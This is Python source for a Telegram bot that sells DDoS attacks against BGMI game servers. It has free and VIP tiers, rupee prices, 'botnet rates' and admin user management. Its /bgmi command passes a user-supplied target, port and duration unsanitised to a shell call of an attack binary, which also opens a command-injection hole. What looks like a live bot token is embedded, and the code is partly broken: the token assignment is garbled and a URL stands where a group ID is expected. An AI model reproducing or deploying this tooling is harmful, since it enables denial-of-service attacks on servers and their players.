#!/usr/bin/python3
#By @XDFLASHERV6

import telebot
import subprocess
import requests
import datetime
import os
import time

# Bot token
BOT_TOKEN = "8245251931"
bot = :AAFyFE88RoXlUIsIfqD4-1ZTt0kfFlRfnXU

# Allowed Group IDs
ALLOWED_GROUPS = {"https://t.me/ddosbot096"}

# Admin user IDs
admin_id = ["6293907676"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File for free users
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Attack counter for cooldown system
attack_counter = {}
LAST_ATTACK_RESET = {}

# Cooldown settings
MAX_ATTACKS = 5  # Maximum attacks before cooldown
COOLDOWN_DURATION = 30  # 5 minutes cooldown in seconds

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to check if command is from allowed group
def is_allowed_group(message):
    chat_id = str(message.chat.id)
    return chat_id in ALLOWED_GROUPS

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to reset attack counter
def reset_attack_counter(user_id):
    attack_counter[user_id] = 0
    LAST_ATTACK_RESET[user_id] = datetime.datetime.now()

# Function to check and update attack cooldown
def check_attack_cooldown(user_id):
    current_time = datetime.datetime.now()
    
    # Initialize if user not in dictionary
    if user_id not in attack_counter:
        attack_counter[user_id] = 0
        LAST_ATTACK_RESET[user_id] = current_time
    
    # Check if cooldown period has passed
    if user_id in LAST_ATTACK_RESET:
        time_diff = (current_time - LAST_ATTACK_RESET[user_id]).seconds
        if time_diff >= COOLDOWN_DURATION:
            # Reset counter if cooldown period is over
            reset_attack_counter(user_id)
            return True, None
    
    # Check if user has reached max attacks
    if attack_counter[user_id] >= MAX_ATTACKS:
        remaining_time = COOLDOWN_DURATION - (current_time - LAST_ATTACK_RESET[user_id]).seconds
        minutes = remaining_time // 60
        seconds = remaining_time % 60
        return False, f"⚠️ You've reached the maximum of {MAX_ATTACKS} attacks! Please wait {minutes}m {seconds}s before attacking again."
    
    return True, None

# Function to record an attack
def record_attack(user_id):
    if user_id not in attack_counter:
        attack_counter[user_id] = 0
        LAST_ATTACK_RESET[user_id] = datetime.datetime.now()
    
    attack_counter[user_id] += 1
    
    # Return remaining attacks
    remaining = MAX_ATTACKS - attack_counter[user_id]
    return remaining

@bot.message_handler(commands=['add'])
def add_user(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"✅ User {user_to_add} Added Successfully."
            else:
                response = "❌ User already exists."
        else:
            response = "⚠️ Please specify a user ID to add."
    else:
        response = "🔒 Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"✅ User {user_to_remove} removed successfully."
            else:
                response = f"❌ User {user_to_remove} not found in the list."
        else:
            response = "⚠️ Please Specify A User ID to Remove.\nUsage: /remove <userid>"
    else:
        response = "🔒 Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "📝 Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "✅ Logs Cleared Successfully"
        except FileNotFoundError:
            response = "📝 Logs are already cleared."
    else:
        response = "🔒 Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "📋 Authorized Users:\n"
                    for uid in user_ids:
                        try:
                            user_info = bot.get_chat(int(uid))
                            username = user_info.username
                            response += f"- @{username} (ID: {uid})\n"
                        except Exception as e:
                            response += f"- User ID: {uid}\n"
                else:
                    response = "📭 No data found"
        except FileNotFoundError:
            response = "📭 No data found"
    else:
        response = "🔒 Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "📭 No data found."
                bot.reply_to(message, response)
        else:
            response = "📭 No data found"
            bot.reply_to(message, response)
    else:
        response = "🔒 Only Admin Can Run This Command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    response = f"🆔 Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time, remaining_attacks):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"""⚡ {username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃! ⚡

🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {target}
🔌 𝐏𝐨𝐫𝐭: {port}
⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
🔧 𝐌𝐞𝐭𝐡𝐨𝐝: BGMI

📊 Attacks Remaining: {remaining_attacks}/{MAX_ATTACKS}
👑 By @XDFLASHERV6"""
    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    if not is_allowed_group(message):
        bot.reply_to(message, "❌ This command can only be used in authorized groups!")
        return
    
    user_id = str(message.chat.id)
    
    # Check if user is authorized
    if user_id not in allowed_user_ids and user_id not in admin_id:
        response = "❌ You Are Not Authorized To Use This Command.\n👑 By @XDFLASHERV6"
        bot.reply_to(message, response)
        return
    
    # Check attack cooldown (5 attacks limit)
    can_attack, cooldown_msg = check_attack_cooldown(user_id)
    if not can_attack:
        bot.reply_to(message, cooldown_msg)
        return
    
    # Check per-command cooldown for non-admins
    if user_id not in admin_id:
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
            response = "⏰ You Are On Cooldown. Please Wait 10 Seconds Before Running The /bgmi Command Again."
            bot.reply_to(message, response)
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()
    
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        time_duration = int(command[3])
        
        if time_duration > 181:
            response = "❌ Error: Time must be less than 180 seconds."
        else:
            # Record the attack
            remaining_attacks = record_attack(user_id)
            
            record_command_logs(user_id, '/bgmi', target, port, time_duration)
            log_command(user_id, target, port, time_duration)
            start_attack_reply(message, target, port, time_duration, remaining_attacks)
            
            full_command = f"./XDFLASHER {target} {port} {time_duration} 200"
            subprocess.run(full_command, shell=True)
            
            response = f"✅ BGMI Attack Finished!\n🎯 Target: {target}\n🔌 Port: {port}\n⏱️ Duration: {time_duration}s\n📊 Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}"
    else:
        response = "📝 Usage: /bgmi <target> <port> <time>\n👑 By @XDFLASHERV6"
    
    bot.reply_to(message, response)

# Handler for /myusage command - shows remaining attacks
@bot.message_handler(commands=['myusage'])
def show_my_usage(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids and user_id not in admin_id:
        response = "❌ You Are Not Authorized To Use This Command."
        bot.reply_to(message, response)
        return
    
    if user_id in admin_id:
        response = "👑 Admin users have unlimited attacks!"
    else:
        if user_id not in attack_counter:
            attacks_used = 0
        else:
            attacks_used = attack_counter.get(user_id, 0)
        
        remaining = MAX_ATTACKS - attacks_used
        
        if user_id in LAST_ATTACK_RESET:
            current_time = datetime.datetime.now()
            time_diff = (current_time - LAST_ATTACK_RESET[user_id]).seconds
            if time_diff < COOLDOWN_DURATION:
                remaining_time = COOLDOWN_DURATION - time_diff
                minutes = remaining_time // 60
                seconds = remaining_time % 60
                reset_info = f"\n⏰ Reset in: {minutes}m {seconds}s"
            else:
                reset_info = "\n✅ Cooldown period ended - attacks reset!"
        else:
            reset_info = ""
        
        response = f"""📊 Your Attack Usage:
┌─────────────────┐
│ 🎯 Attacks Used: {attacks_used}/{MAX_ATTACKS}
│ ⚡ Remaining: {remaining}
└─────────────────┘{reset_info}

💡 After {MAX_ATTACKS} attacks, you'll have a {COOLDOWN_DURATION//60} minute cooldown!"""
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    # Show last 10 logs only
                    recent_logs = user_logs[-10:]
                    response = "📋 Your Recent Command Logs:\n" + "".join(recent_logs)
                else:
                    response = "📭 No Command Logs Found For You."
        except FileNotFoundError:
            response = "📭 No command logs found."
    else:
        response = "❌ You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    if not is_allowed_group(message):
        return
    
    help_text = """🤖 **Available Commands:**

🔥 **Attack Commands:**
 /bgmi - Attack BGMI servers
 /myusage - Check your remaining attacks

📊 **Info Commands:**
 /rules - Please check before use
 /mylogs - Check your recent attacks
 /plan - Checkout our botnet rates
 /id - Get your user ID

👑 **Admin Commands:**
 /admincmd - Shows all admin commands

⚡ **Attack Limits:**
 • Max {MAX_ATTACKS} attacks before cooldown
 • {COOLDOWN_DURATION//60} minute cooldown after limit
 • 10 second delay between attacks

👑 By @XDFLASHERV6""".format(MAX_ATTACKS=MAX_ATTACKS, COOLDOWN_DURATION=COOLDOWN_DURATION)
    
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def welcome_start(message):
    if not is_allowed_group(message):
        return
    
    user_name = message.from_user.first_name
    response = f"""🎉 Welcome to Your Home, {user_name}! 🎉

Feel Free to Explore.
Type /help to get started!

🔥 **Attack Features:**
• {MAX_ATTACKS} free attacks
• {COOLDOWN_DURATION//60} min cooldown after limit
• Powerful BGMI method

Welcome To The World's Best DDoS Bot
👑 By @XDFLASHERV6"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    if not is_allowed_group(message):
        return
    
    user_name = message.from_user.first_name
    response = f"""📜 **Rules for {user_name}:** 📜

1️⃣ Don't run too many attacks (max {MAX_ATTACKS} before cooldown)
2️⃣ Don't run 2 attacks at the same time
3️⃣ We check logs daily - follow rules to avoid ban!
4️⃣ Respect other users
5️⃣ No spamming commands

⚠️ Violation may result in permanent ban!

👑 By @XDFLASHERV6"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    if not is_allowed_group(message):
        return
    
    user_name = message.from_user.first_name
    response = f"""💎 **VIP Plan Details** 💎

{user_name}, Only 1 Plan Is Powerful Enough!

✨ **VIP Features:**
┌─────────────────┐
│ ⚡ Attack Time: 200s
│ ⏰ Cooldown: 2 Min  
│ 🔥 Concurrent: 300
└─────────────────┘

💰 **Price List:**
├── Day: 150 Rs
├── Week: 900 Rs
└── Month: 1600 Rs

🎁 Free users get {MAX_ATTACKS} attacks with {COOLDOWN_DURATION//60}min cooldown!

Contact @XDFLASHERV6 for VIP access!"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    if not is_allowed_group(message):
        return
    
    response = """👑 **Admin Commands:** 👑

/add <userId> - Add a User
/remove <userId> - Remove a User
/allusers - List authorized users
/logs - View all user logs
/broadcast - Send broadcast message
/clearlogs - Clear logs file

📊 **Cooldown Settings:**
• Max Attacks: {MAX_ATTACKS}
• Cooldown: {COOLDOWN_DURATION//60} minutes

👑 By @XDFLASHERV6""".format(MAX_ATTACKS=MAX_ATTACKS, COOLDOWN_DURATION=COOLDOWN_DURATION)
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if not is_allowed_group(message):
        return
    
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "📢 **Message To All Users From Admin:** 📢\n\n" + command[1]
            success_count = 0
            fail_count = 0
            
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for uid in user_ids:
                    try:
                        bot.send_message(uid, message_to_broadcast, parse_mode='Markdown')
                        success_count += 1
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {uid}: {str(e)}")
                        fail_count += 1
            
            response = f"✅ Broadcast Sent!\n✓ Success: {success_count}\n✗ Failed: {fail_count}"
        else:
            response = "⚠️ Please provide a message to broadcast.\nUsage: /broadcast <message>"
    else:
        response = "🔒 Only Admin Can Run This Command."

    bot.reply_to(message, response)

# Channel check decorator
def channel_required(func):
    def wrapper(message):
        if not is_allowed_group(message):
            bot.reply_to(message, "❌ This bot can only be used in authorized channels/groups!")
            return
        return func(message)
    return wrapper

print("🤖 Bot Started Successfully!")
print(f"📊 Allowed Groups: {ALLOWED_GROUPS}")
print(f"⚡ Max Attacks: {MAX_ATTACKS}")
print(f"⏰ Cooldown Duration: {COOLDOWN_DURATION//60} minutes")
print("👑 By @XDFLASHERV6")

bot.polling()
#By @XDFLASHERV6